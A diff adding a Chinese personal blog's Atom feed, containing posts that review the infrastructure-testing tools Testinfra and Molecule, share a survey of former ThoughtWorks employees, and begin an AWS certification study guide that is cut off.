@@ -1,0 +1,2145 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>杜屹东的博客</title>
+  <subtitle>云服务解决方案架构师</subtitle>
+  <link href="/atom.xml" rel="self"/>
+  
+  <link href="https://www.duyidong.com/"/>
+  <updated>2017-04-20T04:20:02.000Z</updated>
+  <id>https://www.duyidong.com/</id>
+  
+  <author>
+    <name>杜屹东</name>
+    
+  </author>
+  
+  <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>基础设施代码测试</title>
+    <link href="https://www.duyidong.com/2017/04/13/Infrastructure-as-Code-Testing/"/>
+    <id>https://www.duyidong.com/2017/04/13/Infrastructure-as-Code-Testing/</id>
+    <published>2017-04-13T05:41:29.000Z</published>
+    <updated>2017-04-20T04:20:02.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>在DevOps的文化中有一个已经被广泛认可的概念叫做<a href="https://martinfowler.com/bliki/InfrastructureAsCode.html" target="_blank" rel="external">基础设施及代码</a>，意在将基础设施以配置文件的方式纳入版本管理以达到更灵活且便于管理的目的，从而更加适应基础设施频繁变更需求。</p>
+<p>虽说此举俨然已将<a href="https://www.duyidong.com/2016/05/19/CI-CD/">CI/CD</a>（持续集成和持续交付）概念应用在了基础设施代码上，然而在应用产品的<a href="https://www.duyidong.com/tags/%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%8F%91%E5%B8%83/">持续部署与发布</a>实施过程中，基础设施变更仍然是一件令人<em>胆战心惊</em>的事，原因很简单——没有<strong>反馈及时</strong>且<strong>覆盖充分</strong>的测试。</p>
+<p>随着基础设施即代码的不断推广，这一痛点变得越来越明显，最近一期<a href="https://assets.thoughtworks.com/assets/technology-radar-vol-16-cn.pdf" target="_blank" rel="external">ThoughtWorks技术雷达</a>中列出了两个工具<strong>Molecule</strong>和<strong>Testinfra</strong>一个是用于测试Ansible Role(如果还不知道Ansible是什么请移步我的另一篇博客：<a href="https://www.duyidong.com/2016/06/15/Ansible%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B0/">Ansible学习小计</a>)，一个用于测试基础设施，下面我就来试用一下这两个工具。</p>
+<h2 id="Testinfra介绍"><a href="#Testinfra介绍" class="headerlink" title="Testinfra介绍"></a>Testinfra介绍</h2><p><a href="https://github.com/philpep/testinfra" target="_blank" rel="external">Testinfra</a>是由Python社区贡献的基础设施实际状态自动化测试工具，其目标是成为<a href="http://serverspec.org/" target="_blank" rel="external">Serverspec</a>在Python中的等价物，并且作为<strong>Pytest</strong>测试引擎的插件来使用。</p>
+<p>官方文档：<a href="http://testinfra.readthedocs.io/en/latest/index.html" target="_blank" rel="external">http://testinfra.readthedocs.io/en/latest/index.html</a></p>
+<h3 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h3><p>环境准备：</p>
+<pre><code>$ pip install testinfra      # 安装Testinfra
+$ pip install paramiko       # Python的SSH支持以执行远程测试
+$ pip install pytest-xdist   # 添加多线程支持
+</code></pre><p>来感受下Testinfra的写法:</p>
+<pre><code class="python">def test_passwd_file(File):         # 定义文件检查
+    passwd = File(&quot;/etc/passwd&quot;)    # 定义文件
+    assert passwd.contains(&quot;root&quot;)  # 文件是否包含关键字”root“
+    assert passwd.user == &quot;root&quot;    # 文件owner是否为root
+    assert passwd.group == &quot;root&quot;   # 文件所属组是否为root
+    assert passwd.mode == 0644      # 检查文件权限
+
+
+def test_nginx_is_installed(Package):
+    nginx = Package(&quot;nginx&quot;)
+    assert nginx.is_installed       # nginx是否安装
+    assert nginx.version.startswith(&quot;1.10&quot;) # 检查nginx版本
+
+
+def test_nginx_running_and_enabled(Service):
+    nginx = Service(&quot;nginx&quot;)
+    assert nginx.is_running         # 检查nginx是否已启动
+    assert nginx.is_enabled         # nginx是否配置开机自启
+</code></pre>
+<p>基本和Python的单元测试一模一样，下面来看运行结果：</p>
+<pre><code>$ testinfra -v test_myinfra.py
+</code></pre><p><img src="/images/Testinfra_local_success.png" alt=""></p>
+<p>报错也是PyTest的尿性：</p>
+<p><img src="/images/Testinfra_local_fail.png" alt=""></p>
+<h3 id="远程测试虚拟机"><a href="#远程测试虚拟机" class="headerlink" title="远程测试虚拟机"></a>远程测试虚拟机</h3><p>通过配置ssh并在启动时加入如下参数：</p>
+<pre><code># -n 为指定并发数 --connection为指定链接方式
+$ testinfra -n 1 -v --host=&quot;hostname&quot; --connection=ssh test_myinfra.py
+</code></pre><p>感觉执行方式和Ansible有些相似，以下为执行结果：</p>
+<p><img src="/images/Testinfra_remote_success.png" alt=""></p>
+<p>耗时6s，中规中矩吧。</p>
+<h3 id="其他功能"><a href="#其他功能" class="headerlink" title="其他功能"></a>其他功能</h3><p>除了SSH协议链接Testinfra还支持paramiko，docker，salt，kubectl等连接方式，对于Docker的测试，无外乎也是在起起来的容器上使用<code>docker exec</code>的方法对基础设施即环境配置进行验证。</p>
+<p>另外Testinfra支持自定义module的形式保证测试方法的灵活性，同时Testinfra可以再PyTest之外用于调用SSH连接从而进行测试，形如：</p>
+<pre><code>&gt;&gt;&gt; import testinfra
+&gt;&gt;&gt; conn = testinfra.get_backend(&quot;paramiko://root@server:2222&quot;, sudo=True)
+&gt;&gt;&gt; conn.File(&quot;/etc/shadow&quot;).mode == 0640
+True
+</code></pre><h3 id="Testinfra评价"><a href="#Testinfra评价" class="headerlink" title="Testinfra评价"></a>Testinfra评价</h3><p>在基础设施代码的测试金字塔中，Testinfra提供了以单台服务器为单位的基础设施测试，从而确保了代码有一个正确的运行环境；然而这种层面的测试即使不使用测试工具也很容易进行，与云环境紧密相关的基础设施对测试的需求应该是对架构的整体描述而不是局限于一个计算单元，这一点上，Testinfra还没有显现出它对测试金字塔高层级测试的功力。</p>
+<h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><ul>
+<li>基本涵盖了应用所需环境测试的内容，且可灵活扩展。</li>
+<li>可读性好，学习成本低.</li>
+<li>环境依赖简单，能够与项目完美结合。</li>
+</ul>
+<h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><ul>
+<li>测试未能覆盖到IaaS层的测试，仅能够在操作系统之上进行测试。对于云环境的基础设施还包括网络，负载均衡，数据库等等资源，这些都不能照顾到。</li>
+<li>测试覆盖率虽然有所提升，但反馈不够及时。在开发和Debug过程中最痛苦的应该是每次使用新代码创建基础设施都要等很久才能得到反馈，这个问题并没有得到解决。</li>
+<li>报错信息不够友好，个人认为基础设施的测试应该不能等同于代码层面的测试，所以PyTest的报错方式并不能让用户一眼就看到是哪方面出了错误；往远了说，要根据这个报错信息Trigger一个行为也很难做到。</li>
+</ul>
+<h2 id="Molecule介绍"><a href="#Molecule介绍" class="headerlink" title="Molecule介绍"></a>Molecule介绍</h2><p><a href="https://github.com/metacloud/molecule" target="_blank" rel="external">MOLECULE</a>旨在帮助开发和测试Ansible的Role。通过在虚拟机或容器上为正在运行的Ansible Role的测试构<br>建脚手架，我们无需再手工创建这些测试环境。Molecule利用Vagrant，Docker和OpenStack来管理虚拟机或容器，并支持Serverspec、Testinfra或Goss来运行测试。在sequence facility model中的默认步骤包括：虚拟机管理，Ansible语法静态检查，幂等性测试和收敛性测试。</p>
+<p>话不多说，我们来看看这个工具究竟能解决什么样的问题吧。</p>
+<h3 id="版本支持"><a href="#版本支持" class="headerlink" title="版本支持"></a>版本支持</h3><p>目前Molecule支持的Ansible版本为<code>2.1.4.0</code>和<code>2.2.1.0</code>，好吧，这一点，虽然项目上还在用<code>1.7.2</code>（一直担心<em>Breake change</em>所以没有升上去），但我觉得大部分公司应该使用的是<code>2.2</code>以上的版本，这一点我没有异议。</p>
+<h3 id="Quick-Start-1"><a href="#Quick-Start-1" class="headerlink" title="Quick Start"></a>Quick Start</h3><p>环境准备</p>
+<pre><code>$ yum install ansible -y      # 为了避免踩坑不使用pip的ansible
+$ pip install docker          # 安装python的docker支持
+$ pip install molecule        # 主角登场
+</code></pre><p>运行</p>
+<pre><code>$ molecule init --role foo --driver docker
+$ cd foo
+$ molecule test
+</code></pre><p>运行结果：</p>
+<p><img src="/images/Molecule_Test_Success.png" alt=""></p>
+<p>第一次运行速度比较慢，因为运行Ansible需要到Docker镜像仓库拉取一个Ubuntu的镜像，可以从Log里看出，整个测试过程包含如下步骤：</p>
+<ul>
+<li>从基础镜像（Ubuntu）创建一个测试需要的镜像（docker image）</li>
+<li>从镜像启动一个测试运行需要的容器（docker container）</li>
+<li>开始测试，运行playbook</li>
+<li>使用Testinfra判断准备环境是否正确</li>
+<li>测试完毕，停止并删除容器</li>
+</ul>
+<p>整个过程容器的创建和销毁并没有占用很多时间，和跑一个Ansible时间相差不多。</p>
+<h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>Molecule的配置文件采用的yml，可以在项目下也可以放到<code>~/.config/molecule/config.yml</code>作为默认配置，示例如下：</p>
+<pre><code>---
+dependency:
+  name: galaxy         # Molecule使用Ansible Galaxy拉取Role
+driver:
+  name: docker         # 使用Docker引擎跑测试
+docker:
+  containers:          # 容器配置
+    - name: foo
+      image: ubuntu
+      image_version: latest
+      ansible_groups:  # 目标机器组
+        - group1
+verifier:
+  name: testinfra      # 验证最终执行结果
+</code></pre><p>其中Driver除了Docker还支持OpenStack及Vagrant，Verifier除了Testinfra还可选Serverspec及Goss。</p>
+<h3 id="测试方法"><a href="#测试方法" class="headerlink" title="测试方法"></a>测试方法</h3><p>关于测试内容的定义，看一下<code>test/test_default.py</code>文件：</p>
+<pre><code>import testinfra.utils.ansible_runner
+
+testinfra_hosts = testinfra.utils.ansible_runner.AnsibleRunner(
+    &#39;.molecule/ansible_inventory&#39;).get_hosts(&#39;all&#39;)
+
+
+def test_hosts_file(File):
+    f = File(&#39;/etc/hosts&#39;)
+
+    assert f.exists
+    assert f.user == &#39;root&#39;
+    assert f.group == &#39;root&#39;
+</code></pre><p>简单看来就是利用Testinfra看了下/etc/hosts是否存在，所属用户和所属组是否为root</p>
+<h3 id="Molecule评价"><a href="#Molecule评价" class="headerlink" title="Molecule评价"></a>Molecule评价</h3><p>与其说Molecule是一个新的Ansible测试工具不如说是一种组合docker，Testinfra和Ansible的测试方法，换总说法它并不是一个集成在Ansible之中的更细粒度的测试方法，而是高于Ansible的更适合于放在Pipeline中作为测试Ansible运行最终结果的一个工具集，其效果大致和运行<code>docker run XXX ansible</code>之后再运行<code>Testinfra -v</code>两行shell命令是一样的</p>
+<h4 id="优点-1"><a href="#优点-1" class="headerlink" title="优点"></a>优点</h4><ul>
+<li>开始关注自动化配置脚本的测试，不失为一种尝试</li>
+<li>使用Docker作为引擎，速度还可以</li>
+<li>能够提升更改Ansible脚本后的构建信心</li>
+</ul>
+<h4 id="缺点-1"><a href="#缺点-1" class="headerlink" title="缺点"></a>缺点</h4><ul>
+<li>仍然要运行完Playbook才能看到结果，并没有解决<strong>反馈不及时</strong>的痛点</li>
+<li>不支持细粒度的测试，且对一个playbook使用不同参数构建不同环境的应用场景也没有很好的支持</li>
+<li>不管是使用Docker还是Vagrant，都增加了<em>空间</em>的消耗，且增加了<em>知识成本</em></li>
+</ul>
+<h2 id="综上所述"><a href="#综上所述" class="headerlink" title="综上所述"></a>综上所述</h2><p>随着DevOps的普及，已经有人开始关注基础设施代码测试这一块的工作，但这些测试工具还在初级阶段，反馈不能及时，增加覆盖面的成本也还较高，且不能很好地与云环境结合。<br>由于在软件开发中基础设施对业务价值的贡献并不明显，提升Ops技能与其说能过帮助公司挣钱不如说是帮公司省钱；而且在大部分项目中基础设施变更并没有那么频繁，紧急的问题通常还是由Ops（或者是被称为DevOps的一个角色）手动来解决，这种现象在国内公司尤其明显。大家对DevOps的认识还没有达到不一致，DevOps中的测试也还没有被定义清楚，基础设施代码的测试，还有很长的路要走。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;在DevOps的文化中有一个已经被广泛认可的概念叫做&lt;a href=&quot;https://martinfowler.com/bliki/InfrastructureAsCode.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;基础设施及代码&lt;/a&gt;，意
+    
+    </summary>
+    
+    
+      <category term="Infrastructure as Code" scheme="https://www.duyidong.com/tags/Infrastructure-as-Code/"/>
+    
+      <category term="ThoughtWorks技术雷达" scheme="https://www.duyidong.com/tags/ThoughtWorks%E6%8A%80%E6%9C%AF%E9%9B%B7%E8%BE%BE/"/>
+    
+      <category term="基础设施即代码" scheme="https://www.duyidong.com/tags/%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%8D%B3%E4%BB%A3%E7%A0%81/"/>
+    
+      <category term="持续交付" scheme="https://www.duyidong.com/tags/%E6%8C%81%E7%BB%AD%E4%BA%A4%E4%BB%98/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>离骚</title>
+    <link href="https://www.duyidong.com/2017/04/12/leave-TW/"/>
+    <id>https://www.duyidong.com/2017/04/12/leave-TW/</id>
+    <published>2017-04-11T16:01:40.000Z</published>
+    <updated>2017-04-12T13:16:44.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>最近在公司的离职群里出现了一个调查问卷，我觉得很有意思，引发了我对ThoughtWorks的一些思考，顺手贴在这里。</p>
+<p>另，骚窝为ThoughtWorks音译，所以从骚窝离职的人被称为离骚。</p>
+<pre><code>【骚人一】在骚窝4年多，2015年4月离开
+
+
+离开骚窝后，有什么让你兴奋？
+
+至少在一开始，创业让我兴奋；做一个自己的产品让我兴奋；
+
+现在的工作和生活方式，与在骚窝最大的不同是什么？
+
+用自己喜欢的技术让我兴奋。
+
+你认为骚窝对你最大的改变是什么？
+
+认识了一大帮牛人，体验到最好的开发方式，开拓了视野。
+
+你最怀念骚窝哪一点儿？
+
+骚！引领技术风骚！
+
+你想对骚窝或者骚窝的某个人说几句话吗？
+
+好多熟人都走了，现在回公司，有点陌生了。所以不知道说啥。
+</code></pre><pre><code>【骚人二】在骚窝3年多，2009年底离开
+
+
+离开骚窝后，有什么让你兴奋？
+
+孩子的成长。
+
+现在的工作和生活方式，与在骚窝最大的不同是什么？
+
+出差。
+
+你认为骚窝对你最大的改变是什么？
+
+敏捷方法及时间管理观念（time box，迭代等）
+
+你最怀念骚窝哪一点儿？
+
+温馨的工作分氛围
+
+你想对骚窝或者骚窝的某个人说几句话吗？
+
+所有在TW一起工作过的同事：谢谢你们，依然怀念和你们在一起的时光。
+</code></pre><pre><code>【骚人三】在骚窝3个月，2015年底离开
+
+
+离开骚窝后，有什么让你兴奋？
+
+重新聚焦自身优势
+
+现在的工作和生活方式，与在骚窝最大的不同是什么？
+
+没那么活跃了，也规律了
+
+你认为骚窝对你最大的改变是什么？
+
+不大。
+
+你最怀念骚窝哪一点儿？
+
+骨子里的自由和文艺。
+</code></pre><pre><code>【骚人四】在骚窝5年，2016年7月离开
+
+
+离开骚窝后，有什么让你兴奋？
+
+全心做自己公司的产品，而不是作为vendor。
+
+现在的工作和生活方式，与在骚窝最大的不同是什么？
+
+公司几乎不用微信群沟通（工作上的和工作外的）。
+
+你认为骚窝对你最大的改变是什么？
+
+不断提升自己，接受反馈，提供反馈。
+
+你最怀念骚窝哪一点儿？
+
+一帮人在想办法提升工作效率。
+
+你想对骚窝或者骚窝的某个人说几句话吗？
+
+ThoughtWorks 一直是高标准。怀恋这个程序员的天堂。
+</code></pre><pre><code>【骚人五】在骚窝1年，2016年10月离开
+
+
+离开骚窝后，有什么让你兴奋？
+
+待遇更高了，可以去产品公司了。
+
+现在的工作和生活方式，与在骚窝最大的不同是什么？
+
+在腾讯天天出差。
+
+你认为骚窝对你最大的改变是什么？
+
+对敏捷了解更深，更敢说，企业文化无比认同。
+
+你最怀念骚窝哪一点儿？
+
+扁平化，没心机，简单，单纯，企业文化。
+</code></pre><pre><code>【骚人七】在骚窝5年，2013年离开
+
+
+离开骚窝后，有什么让你兴奋？
+
+有自己的团队了。
+
+现在的工作和生活方式，与在骚窝最大的不同是什么？
+
+执行多了，讨论少了。
+
+你认为骚窝对你最大的改变是什么？
+
+批判性思维，闭环的方法论。
+
+你最怀念骚窝哪一点儿？
+
+人聪明，沟通不费劲。
+
+你想对骚窝或者骚窝的某个人说几句话吗？
+
+一时竟然想不起该说啥...
+</code></pre><pre><code>【骚人八】在骚窝4年，2014年离开
+
+
+离开骚窝后，有什么让你兴奋？
+
+移民了。
+
+现在的工作和生活方式，与在骚窝最大的不同是什么？
+
+毕竟是还了个国家，生活方式截然不同。
+
+你认为骚窝对你最大的改变是什么？
+
+ThoughtWorks给我了太多人生的第一次。
+
+第一次做开源项目，第一次做公开演讲，第一次做售前，第一次做咨询，第一次被人骂代码写得差，第一次把项目做失败……如果没有ThoughtWorks这个平台，可能我依然在过着庸庸碌碌的日子，抱怨现实的压力但又不去设计自己的未来。
+
+这里很累、辛苦、费脑子，在ThoughtWorks注定了要迎接一个又一个挑战，而且很多都是突如其来的。比如在你开会的时候销售总监把你拉出来说过几天有个项目要上，你去一下。
+
+这里有很多很优秀的人，而且更重要的是，他们完全不吝啬将自己的经验、经历、思考问题的过程拿出来跟人分享。当看到他们的邮件他们的博客，我就有种感觉，这些人的存在完全就是为了在你前行的路上亮起一盏灯光，甚至供你仰望的。但这种感觉很好。当你困惑的时候有人诉说，当你懈怠的时候知道其他人都在干什么。
+
+在出差的过程中你会跟同事们结下深厚的友谊，一起准备session，总结回顾，规划项目前景，解决疑难……一切的一切，在过往的工作经历中都是体会不到的。
+
+有一天我选择了走自己的路，但是我前些日子面试的时候，面试官是ThoughtWorks墨尔本办公室之前的Mobile Tech Lead，我问他跟我结对编程过后的感受，他说，“感觉很舒服，很自在，就像回到了ThoughtWorks一样”。那一刻我深刻的感觉到了四年间ThoughtWorks在我身上留下的烙印。
+
+你最怀念骚窝哪一点儿？
+
+人。
+</code></pre><pre><code>【骚人九】在骚窝4年,2016年离开
+
+
+离开骚窝后，有什么让你兴奋？
+
+投入到建设国家健康医疗大数据平台的试点工程中
+
+你现在的工作和生活方式，与在骚窝最大的不同是什么?
+
+周围可用的人才太少，或者可塑之才太少
+
+你认为骚窝对你最大的改变是什么？
+
+开放的理念，社会公正的实践，当然也有自己技术上的提高
+
+你最怀念骚窝哪一点儿？
+
+随便抓个人都能打硬仗
+
+你想对骚窝或者骚窝的某个人说几句话吗?
+
+加油
+</code></pre><pre><code>【骚人十】在骚窝3年,3年前离开
+
+离开骚窝后，有什么让你兴奋？
+
+干事终有有头有尾了。
+
+你现在的工作和生活方式，与在骚窝最大的不同是什么?
+
+专注，可以专注于一个产品，围着这个产品方方面面都做。
+
+全功能，技术不再是唯一的关注点，市场，运营，业务，营收，广告，管理团队，修网络，搭VPN，交办公室租金，给新来的小朋友买电脑，和打扫卫生的阿姨唠嗑......
+
+你认为骚窝对你最大的改变是什么？
+
+开阔了视野，给了一种可能
+
+你最怀念骚窝哪一点儿？
+
+人，还是那帮人，虽然大部分都离职了
+
+你想对骚窝或者骚窝的某个人说几句话吗?
+
+喵同学，你还在等什么
+</code></pre><pre><code>【骚人十一】在骚窝两年半,一零年一月离开
+
+
+离开骚窝后，有什么让你兴奋？
+
+拿到了全额奖学金去美国读书了。当学生的感觉和在骚窝差不多，一样兴奋😊 毕业后去了谷歌
+
+你现在的工作和生活方式，与在骚窝最大的不同是什么?
+
+我现在在谷歌总部的搜索架构组，需要是做大规模的并发系统的开发和优化。这里软件过程比较少。需求都是自己提的。少了些思想的碰撞。当然赚的多了些😄
+
+你认为骚窝对你最大的改变是什么？
+
+接触到不同的客户锻炼到自己的同理心了。了解到了每个人看问题的不同角度。当然明白了软件开发的流程。现在我还在用这些方式来组织我带领的技术小组的开发工作。
+
+你最怀念骚窝哪一点儿？
+
+结对编程😄很喜欢和不同的人工作。学到很多知识、结识了很对朋友
+
+你想对骚窝或者骚窝的某个人说几句话吗?
+
+当时走得很匆忙，没能和大家打好招呼。后来的这些年很想念大家。希望有机会能再见。
+</code></pre><pre><code>【骚人十四】在骚窝4年半,2013.05离开
+
+离开骚窝后，有什么让你兴奋？
+
+业余生活丰富起来，聚会多起来。好奇怪，很多人说国外好寂寞。
+
+你现在的工作和生活方式，与在骚窝最大的不同是什么?
+
+工作：各种不靠谱程序员，各种号称扁平是管理的老板。
+
+生活变化不大。
+
+你认为骚窝对你最大的改变是什么？
+
+在职场人和人可以这样高效自组织协作。
+
+你最怀念骚窝哪一点儿？
+
+feedback，开放式协作
+
+你想对骚窝或者骚窝的某个人说几句话吗?
+
+你仍然是我爱的最深的那家前公司。你最初的梦想是很多人至今的梦想，在我们心里你永远祝福你不忘初心。
+</code></pre><pre><code>【骚人十五】在骚窝一年半,2016年离开
+
+是否得到了当初离开时想要追求的东西？
+
+是
+
+离开骚窝后，有什么让你兴奋？
+
+周围同事平均水平更高了，不用和客户撕扯了，可以专心做东西
+
+你现在的工作和生活方式，与在骚窝最大的不同是什么?
+
+不用每天各种会和敏捷形式化了
+
+你认为骚窝对你最大的改变是什么？
+
+敏捷开发更适合交付项目
+
+你最怀念骚窝哪一点儿？
+
+压力小，交付项目做完就不用操心维护和业务了，不用oncall
+
+你想对骚窝或者骚窝的某个人说几句话吗?
+
+谢谢大家的帮忙^_^美帝血汗工厂的微服务做的一点也不好^_^
+</code></pre><pre><code>【骚人十六】在骚窝俩年多,2013年底离开
+
+是否得到了当初离开时想要追求的东西？
+
+离开时没有什么新的追求
+
+离开骚窝后，有什么让你兴奋？
+
+做不同的事情，尝试不同的岗位
+
+你现在的工作和生活方式，与在骚窝最大的不同是什么?
+
+自由
+
+你认为骚窝对你最大的改变是什么？
+
+觉得牛人还是很多的，上学的时候觉得牛人太少
+
+你最怀念骚窝哪一点儿？
+
+年轻的朋友们
+</code></pre><pre><code>【骚人十七】在骚窝1.3,2015离开
+
+是否得到了当初离开时想要追求的东西？
+
+差不多
+
+离开骚窝后，有什么让你兴奋？
+
+能将自己所学的项目管理方法，学以致用，以证明自己哪些是用的，哪些是错的。
+
+你现在的工作和生活方式，与在骚窝最大的不同是什么?
+
+生活方式没有变，工作变了，要学会适应非全功能团队的协作方式（可以是中国传统的协作方式）
+
+你认为骚窝对你最大的改变是什么？
+
+思维方式变了。也变得更包容了。眼界变得开拓了。
+
+你最怀念骚窝哪一点儿？
+
+在TW待过两个团队，和他们一起工作时的氛围。也就是和他们一起工作太开心了。
+
+你想对骚窝或者骚窝的某个人说几句话吗?
+
+胡凯，感谢你抽时间回复我邮件，帮助我成长。还有，你是对的，我真的又离职了，产品终归是别人的，我没有能“做自己的产品”。
+
+我知道了，除非自己做老板，不可能完全做自己的产品。
+</code></pre><pre><code>【骚人十八】在骚窝1年,2016-10离开
+
+是否得到了当初离开时想要追求的东西？
+
+追求的东西一直都在变化，随着年龄的增长追求的内容也不同，离开以后发现了更多需要自己去熟悉的内容，不仅仅局限在dev范围内部。有得也有失。
+
+离开骚窝后，有什么让你兴奋？
+
+可以全身心的工作到自己的产品中，在离骚每个项目做完以后，就会有另一个项目等着你，之前做过的项目到底是否成功，用户量有多大，并没有多少反馈。项目的结束给我带来的成就感远远小于自己做一个产品上线以后，看到不断有用户注册时的激动。
+
+你现在的工作和生活方式，与在骚窝最大的不同是什么?
+
+不用天天在客户现场应对各种问题和challenge.
+
+你认为骚窝对你最大的改变是什么？
+
+对技术栈的重新定义，对客户的认识以及业务知识
+
+你最怀念骚窝哪一点儿？
+
+自由的工作方式，自己想做点什么事情没有任何阻拦。
+
+你想对骚窝或者骚窝的某个人说几句话吗?
+
+对Dev说，技术不是最终的追求，这个世界是业务起主导作用的世界，没有业务驱动技术很难有实施性的发挥。当技术和业务发生冲突的时候，临时的避让或者妥协是很好的解决方案。没有清晰的对错分界线，也没有技术水平高低的判断条件。当产品满足业务需求，当客户欣然接受，这就是最好的交付结果。远比用各种fashion的技术栈来得实在。
+
+对业务说，业务是主导一切的根源，发现业务和挖掘业务也许是未来发展的新标向。在骚窝做业务的同学们应当发挥比dev更重要的作用，你们是技术实现的基石，也是客户的向导。
+
+对UX说，你们的水平可以说是目前竞争对手中做得最好的团队，一个产品的设计在默写程度上可以左右项目的认可度，提高产品的Level。当客户第一眼看到产品的时候，他们看的不是你用了reactjs还是vuejs，也不是业务需求是否满足。而是产品的外观是否吸引用户。提高设计能力和水平是骚窝继续往下发展的重要法宝。
+
+对PM说，在如此竞争激烈的市场下，每个团队都可以快速开发MVP并投入市场。敏锐的发现市场需求和控制项目进度是制胜的法宝，让客户把他们的成败压在咱们的交付产品或咨询上是把拉近客户的必要手段，我们不一定一直处在乙方的位置，真要是到了一定程度，说不定谁是乙方谁是甲方。提高我们在客户面前的话语权，深度挖掘积累某个行业、领域的知识是我们项目往下走的方向。
+</code></pre><pre><code>【骚人十九】在骚窝6年多,2013离开
+
+是否得到了当初离开时想要追求的东西？
+
+还行
+
+离开骚窝后，有什么让你兴奋？
+
+踏踏实实做产品
+
+你现在的工作和生活方式，与在骚窝最大的不同是什么?
+
+工作上更注重流程了，也更注重每个决策的长期影响
+
+生活上没有国内那么丰富，但得到了环境上的回报
+
+你认为骚窝对你最大的改变是什么？
+
+锻炼了思维方式，从其他角度看软件开发
+
+你最怀念骚窝哪一点儿？
+
+丰富的思维碰撞
+
+你想对骚窝或者骚窝的某个人说几句话吗?
+
+希望每个骚窝人不忘初心，成为思想工作者，通过软件成为更好的自己
+</code></pre><p>从以上调查中可以大致可以分析得出以下信息：</p>
+<ul>
+<li>前TWer们大部分是比较认可TW的企业文化的，认为这里有一帮聪明且主动性强的同事，以及宽松自由的工作环境，想做就做的干劲，同时也有会议太多，沟通花费过高等弊病</li>
+<li>离职后的人一部分人创业，一部分人移民，一部分在国内大公司发展</li>
+<li>在TW时往往只能受雇于人做一些产品开发，这常常成为TWer离职的原因——没有自己的产品</li>
+</ul>
+<p>在以上发言中，七号，十一号，十八号，给我的印象最为深刻。<br>曾经有人告诉我：入职第一天就为离职做好准备的员工是好员工。因为这样的员工往往会保持高度的警惕且持续学习，随时辞职随时都能找到更好待遇的工作的目标，保证了员工提供给公司是高于自己待遇的价值。<br>所以企业最看重的，是价值；职场上最重要的，应该是人。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;最近在公司的离职群里出现了一个调查问卷，我觉得很有意思，引发了我对ThoughtWorks的一些思考，顺手贴在这里。&lt;/p&gt;
+&lt;p&gt;另，骚窝为ThoughtWorks音译，所以从骚窝离职的人被称为离骚。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;【骚人一】在骚窝4年多，2015年4月离
+    
+    </summary>
+    
+    
+      <category term="ThoughtWorks" scheme="https://www.duyidong.com/tags/ThoughtWorks/"/>
+    
+      <category term="职场" scheme="https://www.duyidong.com/tags/%E8%81%8C%E5%9C%BA/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>AWS助理架构师认证考经</title>
+    <link href="https://www.duyidong.com/2017/04/05/How-to-pass-the-aws-certification/"/>
+    <id>https://www.duyidong.com/2017/04/05/How-to-pass-the-aws-certification/</id>
+    <published>2017-04-05T06:48:45.000Z</published>
+    <updated>2017-04-12T13:30:57.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>上周去参加了AWS助理级架构师的考试并顺利通过，是2017年的第一个小目标也是对云服务知识的一个检验，在此分享一下考试的经过和经验。</p>
+<h1 id="什么是AWS认证"><a href="#什么是AWS认证" class="headerlink" title="什么是AWS认证"></a>什么是AWS认证</h1><p>亚马逊作为云计算领域的领头羊，在云计算领域已经有了十多年的积累，亚马逊的云计算不论是从服务还是性能在全球都是首屈一指的。近年来国内有很多创业公司依托于阿里云，微软云，Ucloud等IaaS, PaaS服务构建了许多SaaS服务，其中不乏客如云之类的成功案例，许多大型企业也将自己的基础设施往云上迁移。近两个月腾讯云和中国电信两次以0.01元中标政府云服务项目更是起到了推波助澜的作用。如此种种，可见云服务在IT届的地位已经越来越高，对于从业者的云计算知识要求也必然会越来越高。那么考取云服务界领头羊亚马逊的认证也会变得越来越有价值。<br>AWS目前仅有助理级和专家级两个级别，2017年还会加入大数据，安全，网络三个认证。<br>就目前有的认证而言，开发者(Developer)认证应该是最好考的，助理方案解决架构师(Solutions Architect)次之，助理级最难的是运维（SysOps）。要取得专家级认证必须先取得助理级认证，关系如图：</p>
+<p><img src="/images/AWS_Certification_Level.png" alt=""></p>
+<p>关于八个认证的难以程度即考取顺序建议如下：</p>
+<p><img src="/images/AWS_Certification_Easy_to_Hard.png" alt=""></p>
+<p>笔者选择先考助理架构师，意在先建立一个比较全面和高视角的认识，再考Developer和Sysops也会比较容易。<br>AWS认证是检测自己云计算领域知识最好的方式，同时也是增加求职筹码的一个不错的选择。</p>
+<h1 id="我的考试经历"><a href="#我的考试经历" class="headerlink" title="我的考试经历"></a>我的考试经历</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>笔者在准备考试前有一些AWS的使用经历，大部分在项目中使用，但服务涉及很窄，基本只限于创建instance，明白不同Subnet意味着不同网段。<br>为公司项目做过AWS的虚拟机方案预算，基本知道Instance Type以及Cost有关的一些东西。<br>从开始准备到正式考试大概两个月，每天投入3-4小时，主要花费在阅读文档和动手练习，另外还买了<a href="https://acloud.guru" target="_blank" rel="external">acloud.guru</a>上的一个课程，价格29美刀，没有购买AWS的练习题。</p>
+<h2 id="考前准备"><a href="#考前准备" class="headerlink" title="考前准备"></a>考前准备</h2><ul>
+<li>参考AWS官方<a href="https://aws.amazon.com/certification/certification-prep/" target="_blank" rel="external">考试介绍</a>定位考试的大致方向</li>
+<li>仔细阅读<a href="https://awstrainingandcertification.s3.amazonaws.com/production/AWS_certified_solutions_architect_associate_blueprint.pdf" target="_blank" rel="external">考试大纲</a>，了解考试设计到的知识点和大纲</li>
